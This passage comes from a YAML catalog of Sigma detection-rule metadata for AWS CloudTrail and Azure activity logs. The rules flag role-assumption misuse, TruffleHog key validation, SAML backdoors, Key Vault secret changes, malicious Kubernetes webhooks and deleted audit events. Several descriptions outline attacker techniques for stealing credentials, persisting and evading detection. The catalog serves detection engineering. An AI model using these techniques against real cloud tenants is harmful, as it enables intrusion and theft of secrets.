  - attack.defense-evasion
  - attack.t1556
  time_window: ''
  references:
  - https://docs.aws.amazon.com/singlesignon/latest/userguide/app-enablement.html
  - https://docs.aws.amazon.com/singlesignon/latest/userguide/sso-info-in-cloudtrail.html
  - https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsiamidentitycentersuccessortoawssinglesign-on.html
  false_positives:
  - Authorized changes to the AWS account's identity provider
  notes: ''
- detection_id: 905d389b-b853-46d0-9d3d-dea0d3a3cd49
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_sts_assumerole_misuse.yml
  name: AWS STS AssumeRole Misuse
  description: Identifies the suspicious use of AssumeRole. Attackers could move laterally
    and escalate privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  - T1550
  - T1550.001
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548
  - attack.t1550
  - attack.t1550.001
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/pull/1214
  - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
  false_positives:
  - AssumeRole may be done by a system or network administrator. Verify whether the
    user identity, user agent, and/or hostname should be making changes in your environment.
  - AssumeRole from unfamiliar users or hosts should be investigated. If known behavior
    is causing false positives, it can be exempted from the rule.
  - Automated processes that uses Terraform may lead to false positives.
  notes: ''
- detection_id: 9b1b8e9b-0a5d-4af1-9d2f-4c4b6e7c2c9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_sts_getcalleridentity_trufflehog.yml
  name: AWS STS GetCallerIdentity Enumeration Via TruffleHog
  description: 'Detects the use of TruffleHog for AWS credential validation by identifying
    GetCallerIdentity API calls where the userAgent indicates TruffleHog.

    Threat actors leverage TruffleHog to enumerate and validate exposed AWS keys.

    Successful exploitation allows threat actors to confirm the validity of compromised
    AWS credentials, facilitating further unauthorized access and actions within the
    AWS environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.004
  tags:
  - attack.discovery
  - attack.t1087.004
  time_window: ''
  references:
  - https://www.rapid7.com/blog/post/tr-crimson-collective-a-new-threat-group-observed-operating-in-the-cloud/
  - https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html
  - https://github.com/trufflesecurity/trufflehog
  false_positives:
  - Legitimate internal security scanning or key validation that intentionally uses
    TruffleHog. Authorize and filter known scanner roles, IP ranges, or assumed roles
    as needed.
  notes: ''
- detection_id: b45ab1d2-712f-4f01-a751-df3826969807
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_sts_getsessiontoken_misuse.yml
  name: AWS STS GetSessionToken Misuse
  description: Identifies the suspicious use of GetSessionToken. Tokens could be created
    and used by attackers to move laterally and escalate privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  - T1550
  - T1550.001
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548
  - attack.t1550
  - attack.t1550.001
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/pull/1213
  - https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html
  false_positives:
  - GetSessionToken may be done by a system or network administrator. Verify whether
    the user identity, user agent, and/or hostname should be making changes in your
    environment. GetSessionToken from unfamiliar users or hosts should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: f43f5d2f-3f2a-4cc8-b1af-81fde7dbaf0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_susp_saml_activity.yml
  name: AWS Suspicious SAML Activity
  description: Identifies when suspicious SAML activity has occurred in AWS. An adversary
    could gain backdoor access via SAML.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1548
  - T1550
  - T1550.001
  tags:
  - attack.defense-evasion
  - attack.initial-access
  - attack.lateral-movement
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  - attack.t1548
  - attack.t1550
  - attack.t1550.001
  time_window: ''
  references:
  - https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateSAMLProvider.html
  - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithSAML.html
  false_positives:
  - Automated processes that uses Terraform may lead to false positives.
  - SAML Provider could be updated by a system administrator. Verify whether the user
    identity, user agent, and/or hostname should be making changes in your environment.
  - SAML Provider being updated from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 055fb148-60f8-462d-ad16-26926ce050f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/aws/cloudtrail/aws_update_login_profile.yml
  name: AWS User Login Profile Was Modified
  description: 'Detects activity when someone is changing passwords on behalf of other
    users.

    An attacker with the "iam:UpdateLoginProfile" permission on other users can change
    the password used to login to the AWS console on any user that already has a login
    profile setup.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
  false_positives:
  - Legitimate user account administration
  notes: ''
- detection_id: 288a39fc-4914-4831-9ada-270e9dc12cb4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_aadhybridhealth_adfs_new_server.yml
  name: Azure Active Directory Hybrid Health AD FS New Server
  description: 'This detection uses azureactivity logs (Administrative category) to
    identify the creation or update of a server instance in an Azure AD Hybrid health
    AD FS service.

    A threat actor can create a new AD Health ADFS service and create a fake server
    instance to spoof AD FS signing logs. There is no need to compromise an on-prem
    AD FS server.

    This can be done programmatically via HTTP requests to Azure.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1578
  tags:
  - attack.defense-evasion
  - attack.t1578
  time_window: ''
  references:
  - https://o365blog.com/post/hybridhealthagent/
  false_positives:
  - Legitimate AD FS servers added to an AAD Health AD FS service instance
  notes: ''
- detection_id: 48739819-8230-4ee3-a8ea-e0289d1fb0ff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_aadhybridhealth_adfs_service_delete.yml
  name: Azure Active Directory Hybrid Health AD FS Service Delete
  description: 'This detection uses azureactivity logs (Administrative category) to
    identify the deletion of an Azure AD Hybrid health AD FS service instance in a
    tenant.

    A threat actor can create a new AD Health ADFS service and create a fake server
    to spoof AD FS signing logs.

    The health AD FS service can then be deleted after it is not longer needed via
    HTTP requests to Azure.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1578.003
  tags:
  - attack.defense-evasion
  - attack.t1578.003
  time_window: ''
  references:
  - https://o365blog.com/post/hybridhealthagent/
  false_positives:
  - Legitimate AAD Health AD FS service instances being deleted in a tenant
  notes: ''
- detection_id: ebbeb024-5b1d-4e16-9c0c-917f86c708a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_ad_user_added_to_admin_role.yml
  name: User Added to an Administrator's Azure AD Role
  description: User Added to an Administrator's Azure AD Role
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1098.003
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098.003
  - attack.t1078
  time_window: ''
  references:
  - https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/
  false_positives:
  - PIM (Privileged Identity Management) generates this event each time 'eligible
    role' is enabled.
  notes: ''
- detection_id: 410d2a41-1e6d-452f-85e5-abdd8257a823
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_application_deleted.yml
  name: Azure Application Deleted
  description: Identifies when a application is deleted in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#application-proxy
  false_positives:
  - Application being deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Application deleted from unfamiliar users should be investigated. If known behavior
    is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: ad87d14e-7599-4633-ba81-aeb60cfe8cd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_application_gateway_modified_or_deleted.yml
  name: Azure Application Gateway Modified or Deleted
  description: Identifies when a application gateway is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Application gateway being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Application gateway modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 835747f1-9329-40b5-9cc3-97d465754ce6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_application_security_group_modified_or_deleted.yml
  name: Azure Application Security Group Modified or Deleted
  description: Identifies when a application security group is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Application security group being modified or deleted may be performed by a system
    administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Application security group modified or deleted from unfamiliar users should be
    investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: 93e0ef48-37c8-49ed-a02c-038aab23628e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_container_registry_created_or_deleted.yml
  name: Azure Container Registry Created or Deleted
  description: Detects when a Container Registry is created or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - Container Registry being created or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Container Registry created or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: d2d901db-7a75-45a1-bc39-0cbf00812192
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_creating_number_of_resources_detection.yml
  name: Number Of Resource Creation Or Deployment Activities
  description: Number of VM creations or deployment activities occur in Azure via
    the azureactivity log.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/e534407884b1ec5371efc9f76ead282176c9e8bb/Detections/AzureActivity/Creating_Anomalous_Number_Of_Resources_detection.yaml
  false_positives:
  - Valid change
  notes: ''
- detection_id: 542b9912-c01f-4e3f-89a8-014c48cdca7d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_device_no_longer_managed_or_compliant.yml
  name: Azure Device No Longer Managed or Compliant
  description: Identifies when a device in azure is no longer managed or compliant
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#core-directory
  false_positives:
  - Administrator may have forgotten to review the device.
  notes: ''
- detection_id: 46530378-f9db-4af9-a9e5-889c177d3881
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_device_or_configuration_modified_or_deleted.yml
  name: Azure Device or Configuration Modified or Deleted
  description: Identifies when a device or device configuration in azure is modified
    or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1565.001
  tags:
  - attack.impact
  - attack.t1485
  - attack.t1565.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#core-directory
  false_positives:
  - Device or device configuration being modified or deleted may be performed by a
    system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Device or device configuration modified or deleted from unfamiliar users should
    be investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: af6925b0-8826-47f1-9324-337507a0babd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_dns_zone_modified_or_deleted.yml
  name: Azure DNS Zone Modified or Deleted
  description: Identifies when DNS zone is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565.001
  tags:
  - attack.impact
  - attack.t1565.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  false_positives:
  - DNS zone modified and deleted may be performed by a system administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment.
  - DNS zone modification from unfamiliar users should be investigated. If known behavior
    is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 512cf937-ea9b-4332-939c-4c2c94baadcd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_firewall_modified_or_deleted.yml
  name: Azure Firewall Modified or Deleted
  description: Identifies when a firewall is created, modified, or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1562.004
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Firewall being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Firewall modified or deleted from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 025c9fe7-db72-49f9-af0d-31341dd7dd57
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_firewall_rule_collection_modified_or_deleted.yml
  name: Azure Firewall Rule Collection Modified or Deleted
  description: Identifies when Rule Collections (Application, NAT, and Network) is
    being modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1562.004
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Rule Collections (Application, NAT, and Network) being modified or deleted may
    be performed by a system administrator. Verify whether the user identity, user
    agent, and/or hostname should be making changes in your environment.
  - Rule Collections (Application, NAT, and Network) modified or deleted from unfamiliar
    users should be investigated. If known behavior is causing false positives, it
    can be exempted from the rule.
  notes: ''
- detection_id: a622fcd2-4b5a-436a-b8a2-a4171161833c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_granting_permission_detection.yml
  name: Granting Of Permissions To An Account
  description: Identifies IPs from which users grant access to other users on azure
    resources and alerts when a previously unseen source IP address is used.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098.003
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/e534407884b1ec5371efc9f76ead282176c9e8bb/Detections/AzureActivity/Granting_Permissions_To_Account_detection.yaml
  false_positives:
  - Valid change
  notes: ''
- detection_id: 80eeab92-0979-4152-942d-96749e11df40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_keyvault_key_modified_or_deleted.yml
  name: Azure Keyvault Key Modified or Deleted
  description: Identifies when a Keyvault Key is modified or deleted in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1552
  - T1552.001
  tags:
  - attack.impact
  - attack.credential-access
  - attack.t1552
  - attack.t1552.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Key being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Key modified or deleted from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 459a2970-bb84-4e6a-a32e-ff0fbd99448d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_keyvault_modified_or_deleted.yml
  name: Azure Key Vault Modified or Deleted
  description: Identifies when a key vault is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1552
  - T1552.001
  tags:
  - attack.impact
  - attack.credential-access
  - attack.t1552
  - attack.t1552.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Key Vault being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Key Vault modified or deleted from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: b831353c-1971-477b-abb6-2828edc3bca1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_keyvault_secrets_modified_or_deleted.yml
  name: Azure Keyvault Secrets Modified or Deleted
  description: Identifies when secrets are modified or deleted in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1552
  - T1552.001
  tags:
  - attack.impact
  - attack.credential-access
  - attack.t1552
  - attack.t1552.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Secrets being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Secrets modified or deleted from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: a61a3c56-4ce2-4351-a079-88ae4cbd2b58
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_admission_controller.yml
  name: Azure Kubernetes Admission Controller
  description: 'Identifies when an admission controller is executed in Azure Kubernetes.

    A Kubernetes Admission controller intercepts, and possibly modifies, requests
    to the Kubernetes API server.

    The behavior of this admission controller is determined by an admission webhook
    (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys
    in the cluster.

    An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining
    persistence in the cluster.

    For example, attackers can intercept and modify the pod creation operations in
    the cluster and add their malicious container to every created pod.

    An adversary can use the webhook ValidatingAdmissionWebhook, which could be used
    to obtain access credentials.

    An adversary could use the webhook to intercept the requests to the API server,
    record secrets, and other sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1552
  - T1552.007
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1078
  - attack.credential-access
  - attack.t1552
  - attack.t1552.007
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  false_positives:
  - Azure Kubernetes Admissions Controller may be done by a system administrator.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 9541f321-7cba-4b43-80fc-fbd1fb922808
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_cluster_created_or_deleted.yml
  name: Azure Kubernetes Cluster Created or Deleted
  description: Detects when a Azure Kubernetes Cluster is created or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - Kubernetes cluster being created or  deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Kubernetes cluster created or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 1c71e254-6655-42c1-b2d6-5e4718d7fc0a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_cronjob.yml
  name: Azure Kubernetes CronJob
  description: 'Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes
    Job is a controller that creates one or more pods and ensures that a specified
    number of them successfully terminate.

    Kubernetes Job can be used to run containers that perform finite tasks for batch
    jobs. Kubernetes CronJob is used to schedule Jobs.

    An Adversary may use Kubernetes CronJob for scheduling execution of malicious
    code that would run as a container in the cluster.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.persistence
  - attack.t1053.003
  - attack.privilege-escalation
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
  - https://kubernetes.io/docs/concepts/workloads/controllers/job/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  false_positives:
  - Azure Kubernetes CronJob/Job may be done by a system administrator.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 225d8b09-e714-479c-a0e4-55e6f29adf35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_events_deleted.yml
  name: Azure Kubernetes Events Deleted
  description: Detects when Events are deleted in Azure Kubernetes. An adversary may
    delete events in Azure Kubernetes in an attempt to evade detection.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://github.com/elastic/detection-rules/blob/da3852b681cf1a33898b1535892eab1f3a76177a/rules/integrations/azure/defense_evasion_kubernetes_events_deleted.toml
  false_positives:
  - Event deletions may be done by a system or network administrator. Verify whether
    the username, hostname, and/or resource name should be making changes in your
    environment. Events deletions from unfamiliar users or hosts should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 08d6ac24-c927-4469-b3b7-2e422d6e3c43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_network_policy_change.yml
  name: Azure Kubernetes Network Policy Change
  description: Identifies when a Azure Kubernetes network policy is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.credential-access
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - Network Policy being modified and deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Network Policy being modified and deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: b02f9591-12c3-4965-986a-88028629b2e1
  source_id: sigmahq_sigma
